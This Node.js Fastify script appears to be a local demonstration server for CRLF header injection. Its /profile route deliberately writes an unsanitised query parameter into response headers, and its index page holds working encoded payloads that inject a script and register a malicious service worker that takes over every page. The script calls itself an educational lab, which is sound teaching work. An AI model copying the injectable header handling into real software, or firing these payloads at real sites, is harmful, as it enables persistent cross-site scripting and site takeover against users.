const fastify = require('fastify')({
	logger: true
  });
  
  fastify.get('/', async (request, reply) => {
	const html = `
  <!DOCTYPE html>
  <html>
  <head>
	<title>CRLF + Service Worker Test Server</title>
	<style>
	  body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
	  .step { background: #e6f7ff; border-left: 4px solid #1890ff; padding: 15px; margin: 10px 0; }
	  .attack { background: #ffe6e6; border: 2px solid #ff6b6b; padding: 20px; margin: 20px 0; border-radius: 8px; }
	  a { color: #1890ff; text-decoration: none; padding: 8px 16px; background: #f0f8ff; border-radius: 4px; display: inline-block; margin: 5px; }
	  a:hover { background: #e6f3ff; }
	</style>
  </head>
  <body>
	<h1>🚨 CRLF + Service Worker Test Server</h1>
	<div class="step">
	  <h3>Step 3: XSS via CRLF</h3>
	  <p>Create fake HTML response with JavaScript:</p>
	  <a href="/profile?name=x%0D%0AContent-Type:text/html%0D%0AContent-Length:35%0D%0A%0D%0A<script>alert('CRLF XSS Works!')</script>" target="_blank">CRLF XSS Attack</a>
	</div>
	<div class="attack">
	  <h3>Step 4: SERVICE WORKER TAKEOVER</h3>
	  <p>The Service Worker will intercept ALL requests and show "HACKED BY SERVICE WORKER" on every page.</p>
	  <h4>Method 1: Fixed Content-Length Attack</h4>
	  <a href="/profile?name=x%0D%0AContent-Type:text/html%0D%0AContent-Length:362%0D%0A%0D%0A%3Cscript%3Enavigator.serviceWorker.register(%27/profile?name=sw%250D%250AService-Worker-Allowed:/%250D%250AContent-Type:text/javascript%250D%250AContent-Length:120%250D%250A%250D%250Aself.addEventListener(%2522fetch%2522,e=%3Ee.respondWith(new%20Response(%2522%3Ch1%3EHACKED!%3C/h1%3E%2522,{headers:{%2522Content-Type%2522:%2522text/html%2522}})))%27,{scope:%27/%27}).then(()=%3Ealert(%27Service%20Worker%20Installed!%27))%3C/script%3E" 
		 onclick="return confirm('This will install a malicious Service Worker that takes over the site. Continue?')">
		 EXECUTE SERVICE WORKER ATTACK (Fixed)
	  </a>
	</div>
	<div class="step">
	  <h3>Step 5: Test Takeover</h3>
	  <p>After installing the Service Worker, visit any page to see the takeover:</p>
	  <a href="/test" target="_blank">Test Page (Will be intercepted)</a>
	  <a href="/" target="_blank">Main Page (Will be intercepted)</a>
	</div>
  </body>
  </html>
	`;
	reply
	  .type('text/html')
	  .send(html);
  });
  
  fastify.get('/profile', async (request, reply) => {
	const name = request.query.name || 'Guest';
	console.log(`[VULNERABLE] Processing name parameter: ${JSON.stringify(name)}`);
  
	let [headersPart, body] = name.split('\r\n\r\n');
	if (!body) {
	  body = `<html><body><h1>Hello ${name}!</h1><p>Profile page for ${name}</p></body></html>`;
	  headersPart = `X-User-Name:${name}`;
	}
  
	console.log(`[VULNERABLE] Headers part: ${JSON.stringify(headersPart)}`);
	console.log(`[VULNERABLE] Body: ${JSON.stringify(body)}`);

	const headers = {};
	for (const line of headersPart.split('\r\n')) {
	  const [key, ...valueParts] = line.split(':');
	  if (key && valueParts.join(':').trim()) { // Skip if value is empty
		headers[key.trim()] = valueParts.join(':').trim();
	  }
	}
	console.log(`[VULNERABLE] Parsed headers: ${JSON.stringify(headers)}`);

	reply.hijack();
	const response = reply.raw;

	let headerString = '';
	for (const [key, value] of Object.entries(headers)) {
	  headerString += `${key}: ${value}\r\n`;
	  console.log(`[RESPONSE] Sent header: ${key}: ${value}`);
	}
  
	const contentLength = headers['Content-Length'] || Buffer.byteLength(body);
	if (!headers['Content-Length']) {
	  headerString += `Content-Length: ${contentLength}\r\n`;
	  console.log(`[RESPONSE] Added Content-Length: ${contentLength}`);
	}

	response.writeHead(200, headerString.split('\r\n').filter(line => line).reduce((acc, line) => {
	  const [k, v] = line.split(': ');
	  acc[k] = v;
	  return acc;
	}, {}));

	response.end(body);
	console.log(`[RESPONSE] Sent body: ${JSON.stringify(body)}`);

	return reply;
  });
  
  fastify.get('/test', async (request, reply) => {
	const html = `
  <!DOCTYPE html>
  <html>
  <head>
	<title>Test Page</title>
	<style>body{font-family:Arial;margin:40px;background:#f5f5f5;}</style>
  </head>
  <body>
	<h1>Normal Test Page</h1>
	<p>If you see this content, the Service Worker is NOT active.</p>
	<p>If you see "HACKED BY SERVICE WORKER", the attack worked!</p>
	<a href="/">Back to Main Page</a>
	<script>
	  if ('serviceWorker' in navigator) {
		navigator.serviceWorker.getRegistrations().then(registrations => {
		  console.log('Service Worker registrations:', registrations);
		});
	  }
	</script>
  </body>
  </html>
	`;
	reply
	  .type('text/html')
	  .send(html);
  });
  
  fastify.get('/collect', async (request, reply) => {
	console.log('[ATTACK] Simulated data collection endpoint hit');
	reply
	  .type('text/plain')
	  .header('Access-Control-Allow-Origin', '*')
	  .send('Attack data received');
  });
  
  fastify.setNotFoundHandler((request, reply) => {
	reply
	  .code(404)
	  .type('text/html')
	  .send('<h1>404 Not Found</h1>');
  });

  const start = async () => {
	try {
	  console.log('🚨 VULNERABLE TEST SERVER STARTING 🚨');
	  console.log('=' .repeat(50));
	  console.log('⚠️  WARNING: This server is intentionally vulnerable!');
	  console.log('⚠️  For educational purposes only!');
	  console.log('⚠️  Never expose to the internet!');
	  console.log('=' .repeat(50));
	  console.log('Server running at: http://127.0.0.1:8080');
	  console.log('Press Ctrl+C to stop');
  
	  await fastify.listen({ port: 8080, host: '127.0.0.1' });
	} catch (err) {
	  fastify.log.error(err);
	  process.exit(1);
	}
  };
  
  process.on('SIGINT', () => {
	fastify.close().then(() => {
	  console.log('\n[SERVER] Shutting down...');
	  process.exit(0);
	});
  });
  
  start();